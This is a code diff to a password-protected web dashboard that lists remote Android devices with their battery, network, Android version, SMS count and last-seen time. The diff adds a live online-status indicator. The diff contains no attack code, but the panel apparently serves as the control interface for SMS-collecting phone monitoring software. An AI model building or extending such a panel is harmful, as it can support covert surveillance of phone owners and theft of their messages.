@@ -443,7 +443,7 @@ function renderSidebar(){
       '<div class="dev-uid">'+esc(d.id.substring(0,20))+'...</div>'+
       '<div class="dev-chips"><span class="dchip '+bc+'">⚡'+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
       '<span class="dchip">'+esc(d.network)+'</span>'+
-      '<span class="dchip">'+d.smsCount+' SMS</span></div></div>';
+      '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
   }).join('');
 }
 
@@ -474,8 +474,14 @@ function updateHero(d){
   document.getElementById('dNet').textContent=d.network;
   document.getElementById('dAndroid').textContent=d.android||'?';
   document.getElementById('dSmsCount').textContent=d.smsCount;
-  var diff=Date.now()-d.lastSeen;
-  document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
+  if(d.status==='online'){
+    document.getElementById('dLastSeen').textContent='● ACTIVE';
+    document.getElementById('dLastSeen').style.color='var(--success)';
+  } else {
+    var diff=Date.now()-d.lastSeen;
+    document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
+    document.getElementById('dLastSeen').style.color='var(--muted)';
+  }
 }
 
 // ═══ LOAD DEVICE DATA ═══
@@ -627,7 +633,23 @@ function doLogin(){
   else{document.getElementById('loginError').style.display='block';document.getElementById('loginPass').value='';}
 }
 document.addEventListener('keydown',function(e){if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter')doLogin();});
-setInterval(function(){document.getElementById('footerTime').textContent=new Date().toLocaleString();},1000);
+setInterval(function(){
+  document.getElementById('footerTime').textContent=new Date().toLocaleString();
+  // Refresh hero metrics in real-time
+  if(selDev) {
+    var dev=allDevs.find(function(d){return d.id===selDev;});
+    if(dev) {
+      if(dev.status==='online'){
+        document.getElementById('dLastSeen').textContent='● ACTIVE';
+        document.getElementById('dLastSeen').style.color='var(--success)';
+      } else {
+        var diff=Date.now()-dev.lastSeen;
+        document.getElementById('dLastSeen').textContent=diff<60000?Math.floor(diff/1000)+'s ago':diff<3600000?Math.floor(diff/60000)+'m ago':Math.floor(diff/3600000)+'h ago';
+        document.getElementById('dLastSeen').style.color='var(--muted)';
+      }
+    }
+  }
+},1000);
 </script>
 </body>
 </html>
